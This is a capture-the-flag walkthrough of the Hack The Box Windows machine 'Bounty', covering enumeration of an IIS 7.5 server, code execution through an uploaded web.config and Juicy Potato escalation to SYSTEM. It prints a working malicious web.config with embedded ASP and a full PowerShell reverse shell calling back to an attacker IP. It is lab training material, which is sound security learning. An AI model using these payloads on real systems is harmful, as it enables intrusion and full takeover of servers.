---
title: "HTB: Bounty"
date: 2024-11-25
draft: false
os: "Windows"
difficulty: "Easy"
platform: "HTB"
aliases: ["/posts/htb/bounty/"]
tags:
  - htb
  - easy
  - windows
  - iis
  - web-config-upload
  - seimpersonate
  - juicy-potato
categories:
  - walkthrough
---

{{< box-info name="Bounty" os="Windows" difficulty="Easy" ip="10.129.x.x" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
{{< /collapse >}}

### Port 80 - IIS 7.5

Directory fuzzing reveals two interesting hits:

```
/transfer.aspx        (Status: 200) [Size: 941]
/uploadedfiles/       (accessible)
```

`transfer.aspx` is a file upload form, and uploaded files land in `/uploadedfiles/`. The question is -- what file types are allowed?

---

## Foothold

### web.config Upload RCE

IIS 7.5 has a known trick: if you can upload a `web.config` file, you can achieve code execution through embedded ASP code. The upload form accepts `.config` files.

First, confirm RCE with a ping callback:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code begins here.
<%
Dim objShell
Set objShell = Server.CreateObject("WScript.Shell")
Dim cmdOutput
Set cmdOutput = objShell.Exec("cmd /c ping 10.10.14.210").StdOut
Response.Write(cmdOutput.ReadAll)
Set objShell = Nothing
%>
-->
```

Upload, browse to `/uploadedfiles/web.config`, catch the ping on `tcpdump` -- confirmed RCE.

### Reverse Shell

Swap the ping payload for a PowerShell reverse shell:

```xml
<!-- ASP code begins here.
<%
Dim objShell
Set objShell = Server.CreateObject("WScript.Shell")
objShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('10.10.14.210',4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
Set objShell = Nothing
%>
-->
```

Shell as IIS apppool user.

---

## Privilege Escalation

### SeImpersonate → Juicy Potato

The service account has `SeImpersonatePrivilege`. This is a direct path to SYSTEM via Juicy Potato (MS16-075 reflection).

Spawned a Meterpreter session and used `windows/local/ms16_075_reflection_juicy` for a clean escalation to SYSTEM.

---

## Proof

{{< terminal title="root@bounty" >}}
whoami
nt authority\system
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- IIS 7.x allows code execution through `web.config` uploads when the handler is misconfigured -- always test `.config` as an upload extension
- The `/uploadedfiles/` directory being accessible is a dead giveaway for upload-based attacks
- `SeImpersonatePrivilege` on Windows service accounts is almost always exploitable via potato attacks
{{< /callout >}}
